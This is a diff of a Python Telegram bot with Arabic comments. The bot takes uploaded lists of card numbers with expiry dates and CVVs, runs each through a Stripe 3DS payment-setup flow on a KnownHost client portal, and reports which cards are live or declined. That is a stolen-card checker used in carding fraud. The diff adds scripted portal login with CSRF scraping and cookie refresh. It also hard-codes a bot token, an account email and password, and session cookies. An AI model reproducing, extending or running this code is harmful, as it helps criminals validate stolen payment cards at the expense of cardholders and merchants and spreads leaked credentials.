@@ -5,6 +5,8 @@ from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 import requests
+from bs4 import BeautifulSoup
+import json
 import random
 import string
 import time
@@ -12,9 +14,15 @@ import re
 
 # ========== الإعدادات ==========
 BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
-ADMIN_IDS = [5895491379]  # ضع ID التليجرام بتاعك هنا
+ADMIN_IDS = [5895491379]
 
-# الـ Cookies الأصلية
+# بيانات تسجيل الدخول
+USERNAME = "freska2234@gmail.com"
+PASSWORD = "111222333Mm"
+LOGIN_URL = "https://my.knownhost.com/client/login"
+AUTH_COOKIES_FILE = "auth_cookies.json"
+
+# الـ Cookies الثابتة (سيتم تحديث blesta_sid تلقائياً)
 BASE_COOKIES = {
     '_gcl_au': '1.1.1731755719.1761294273',
     'PAPVisitorId': '7095f26325c875e9da4fdaa66171apP6',
@@ -22,11 +30,16 @@ BASE_COOKIES = {
     'lhc_per': 'vid|8994dfb5d60d3132fabe',
     '__mmapiwsid': '0199d361-1f43-7b6b-9c97-250e8a6a95db:0664b174ef7b3925be07d4b964be6a38b1029da7',
     '_gid': 'GA1.2.1609015390.1761435403',
-    'blesta_sid': 'agjvbn46370v0ilm5h72b8h0c7',
     '_rdt_uuid': '1761294274156.8dd9903d-c9cf-401b-885d-0dad4931526f',
     '_uetsid': 'a2028140b1fa11f086cd03ee33166b9d',
     '_uetvid': 'df284260b0b211f086cb537b4a717cc2',
     '_ga': 'GA1.2.586933227.1761298965',
+}
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
 }
 
 # ========== إحصائيات ==========
@@ -46,6 +59,83 @@ stats = {
     'error_details': {},
     'last_response': 'Waiting...',
 }
+
+# ========== دالات تحديث الكوكيز ==========
+def get_csrf_and_cookies(session):
+    """استخراج CSRF Token"""
+    try:
+        r = session.get(LOGIN_URL, headers=HEADERS, timeout=20)
+        r.raise_for_status()
+        soup = BeautifulSoup(r.text, "html.parser")
+        token_input = soup.find("input", {"name": "_csrf_token"})
+        csrf_token = token_input["value"] if token_input and token_input.has_attr("value") else None
+        return csrf_token
+    except:
+        return None
+
+def login_and_get_cookies():
+    """تسجيل الدخول وجلب الكوكيز المهمة"""
+    try:
+        with requests.Session() as s:
+            csrf_token = get_csrf_and_cookies(s)
+            if not csrf_token:
+                print("[!] فشل في الحصول على CSRF Token")
+                return None
+            
+            print(f"[✓] تم استخراج CSRF Token")
+            
+            data = {
+                "_csrf_token": csrf_token,
+                "username": USERNAME,
+                "password": PASSWORD,
+                "remember_me": "true",
+            }
+            
+            post_headers = HEADERS.copy()
+            post_headers.update({
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://my.knownhost.com",
+                "Referer": LOGIN_URL,
+            })
+            
+            r = s.post(LOGIN_URL, headers=post_headers, data=data, allow_redirects=True, timeout=20)
+            
+            all_cookies = s.cookies.get_dict()
+            important = {k: v for k, v in all_cookies.items() if k in ("blesta_sid", "blesta_csid")}
+            
+            if important:
+                with open(AUTH_COOKIES_FILE, "w") as f:
+                    json.dump(important, f, indent=2)
+                print(f"[✓] تم حفظ الكوكيز: {list(important.keys())}")
+                return important
+            else:
+                print("[!] لم يتم العثور على الكوكيز المهمة")
+                return None
+    except Exception as e:
+        print(f"[!] خطأ في تسجيل الدخول: {e}")
+        return None
+
+def load_auth_cookies():
+    """تحميل الكوكيز المحفوظة"""
+    try:
+        if os.path.exists(AUTH_COOKIES_FILE):
+            with open(AUTH_COOKIES_FILE, "r") as f:
+                cookies = json.load(f)
+            print(f"[✓] تم تحميل الكوكيز المحفوظة")
+            return cookies
+        else:
+            print("[!] ملف الكوكيز غير موجود، سيتم تسجيل الدخول...")
+            return login_and_get_cookies()
+    except:
+        return login_and_get_cookies()
+
+def refresh_cookies_if_needed():
+    """تحديث الكوكيز إذا كانت منتهية"""
+    auth_cookies = load_auth_cookies()
+    if auth_cookies:
+        BASE_COOKIES.update(auth_cookies)
+        return True
+    return False
 
 # ========== دالات مساعدة ==========
 def generate_random_string(length):
@@ -101,7 +191,6 @@ async def check_card(card, bot_app):
         stats['checking'] -= 1
         stats['last_response'] = 'Format Error'
         await update_dashboard(bot_app)
-        await send_result(bot_app, card, "ERROR", "صيغة خاطئة")
         return card, "ERROR", "صيغة خاطئة"
     
     card_number, exp_month, exp_year, cvv = parts
@@ -109,15 +198,22 @@ async def check_card(card, bot_app):
     session, muid, sid, guid, stripe_js_id = create_fresh_session()
     csrf_token, setup_secret = get_payment_page(session)
     
+    # إذا فشل Setup Secret، جرب تحديث الكوكيز
     if not setup_secret:
-        stats['errors'] += 1
-        stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
-        stats['checking'] -= 1
-        stats['last_response'] = 'Setup Error'
-        await update_dashboard(bot_app)
-        await send_result(bot_app, card, "ERROR", "فشل Setup Secret")
-        session.close()
-        return card, "ERROR", "فشل Setup"
+        print("[!] فشل Setup Secret، محاولة تحديث الكوكيز...")
+        if refresh_cookies_if_needed():
+            session.close()
+            session, muid, sid, guid, stripe_js_id = create_fresh_session()
+            csrf_token, setup_secret = get_payment_page(session)
+        
+        if not setup_secret:
+            stats['errors'] += 1
+            stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
+            stats['checking'] -= 1
+            stats['last_response'] = 'Setup Error'
+            await update_dashboard(bot_app)
+            session.close()
+            return card, "ERROR", "فشل Setup"
     
     headers = {
         'accept': 'application/json',
@@ -178,7 +274,6 @@ async def check_card(card, bot_app):
                 stats['checking'] -= 1
                 stats['last_response'] = 'R - Declined ❌'
                 await update_dashboard(bot_app)
-                await send_result(bot_app, card, "REJECTED", "Card Declined")
                 session.close()
                 return card, "REJECTED", "Declined"
             elif trans_status == 'C':
@@ -203,7 +298,6 @@ async def check_card(card, bot_app):
                 stats['checking'] -= 1
                 stats['last_response'] = f'Status: {trans_status}'
                 await update_dashboard(bot_app)
-                await send_result(bot_app, card, "UNKNOWN", f"Status: {trans_status}")
                 session.close()
                 return card, "UNKNOWN", trans_status
         else:
@@ -212,7 +306,6 @@ async def check_card(card, bot_app):
             stats['checking'] -= 1
             stats['last_response'] = 'No 3DS Action'
             await update_dashboard(bot_app)
-            await send_result(bot_app, card, "ERROR", "No 3DS Action")
             session.close()
             return card, "ERROR", "No 3DS"
             
@@ -222,7 +315,6 @@ async def check_card(card, bot_app):
         stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
         await update_dashboard(bot_app)
-        await send_result(bot_app, card, "EXCEPTION", str(e)[:30])
         session.close()
         return card, "EXCEPTION", str(e)
 
@@ -333,6 +425,13 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ يوجد فحص جاري!")
         return
     
+    # تحديث الكوكيز قبل البدء
+    await update.message.reply_text("🔄 جاري تحديث الكوكيز...")
+    if not refresh_cookies_if_needed():
+        await update.message.reply_text("⚠️ فشل تحديث الكوكيز! سيتم المحاولة بالكوكيز الحالية...")
+    else:
+        await update.message.reply_text("✅ تم تحديث الكوكيز بنجاح!")
+    
     file = await update.message.document.get_file()
     file_content = await file.download_as_bytearray()
     cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
@@ -411,6 +510,13 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update_dashboard(context.application)
 
 def main():
+    # تحديث الكوكيز عند بدء البوت
+    print("🔄 جاري تحديث الكوكيز...")
+    if refresh_cookies_if_needed():
+        print("✅ تم تحديث الكوكيز بنجاح!")
+    else:
+        print("⚠️ فشل تحديث الكوكيز، سيتم استخدام الكوكيز الافتراضية")
+    
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
